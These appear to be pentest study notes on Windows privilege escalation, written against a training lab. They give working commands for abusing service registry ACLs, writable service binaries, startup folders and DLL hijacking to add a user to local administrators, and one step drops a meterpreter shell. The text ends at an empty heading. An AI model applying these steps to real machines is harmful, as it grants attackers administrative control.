# Exploitation

https://github.com/SecWiki/windows-kernel-exploits

WinPEAS - [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Windows PrivEsc Checklist - [https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

Sherlock - [https://github.com/rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock)

Watson - [https://github.com/rasta-mouse/Watson](https://github.com/rasta-mouse/Watson)

PowerUp - [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

JAWS - [https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS)

Windows Exploit Suggester - [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

Metasploit Local Exploit Suggester - [https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)

Seatbelt - [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)

SharpUp - [https://github.com/GhostPack/SharpUp](https://github.com/GhostPack/SharpUp)

## Escalation Paths

### Autorun
```
# Autorun
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe

# Accesschk
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file. We can move a malicious file to ```C:\Program Files\Autorun Program``` and once the administrative user logs on they'll be prompted to run the program.

### AlwaysInstallElevated
%% Can be found with PowerUp %%
1. Open command prompt and type: reg query HKLM\Software\Policies\Microsoft\Windows\Installer  
2. From the output, notice that “AlwaysInstallElevated” value is 1.  
3. In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer* 
4. From the output, notice that “AlwaysInstallElevated” value is 1.

Can be used with msf windows/local/always_install_elevated
### RegSVCACL
```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```

The output suggests that users belonging to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.
![[regsvc.png]]

Create a windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
1. Exit the text editor and compile the file by typing the following in the command prompt: **x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64')** 
2. Copy the generated file x.exe to the Windows VM.
3. Open command prompt at type: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f  
4. In the command prompt type: sc start regsvc  
5. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: **net localgroup administrators**

### Executable Files
Open command prompt and type: 
```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"  
```
Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.

Open command prompt and type: 
```
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"  
```
In command prompt type: sc start filepermsvc
Confirm the user was added to the local administrators: net localgroup administrators

### Startup Applications
```powershell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
``` 

From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory. We can then move a meterpreter shell over.

Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.  
1. Logoff.  
2. Login with the administrator account credentials.
3. Wait for a session to be created, it may take a few seconds.

### DLL Hijacking
If a program is looking for an expected DLL which does not exist, this can be abused.

1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.  
2. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.  
3. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.  
4. In the input box on the same line type: **dllhijackservice.exe  
5. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.  
6. Next, select from the left-most drop down menu ‘Result’.  
7. In the input box on the same line type: **NAME NOT FOUND  
8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.  
9. Open command prompt and type: **sc start dllsvc  
10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.
11. Open windows_dll.c in a text editor and replace the command used by the system() function to: **cmd.exe /k net localgroup administrators user /add**  
12. Exit the text editor and compile the file by typing the following in the command prompt: **x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll  
13. Copy the generated file hijackme.dll, to the Windows VM.
14. Place hijackme.dll in ‘C:\Temp’.  
15. Open command prompt and type: **sc stop dllsvc & sc start dllsvc**  
16. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: **net localgroup administrators**

### Binary Paths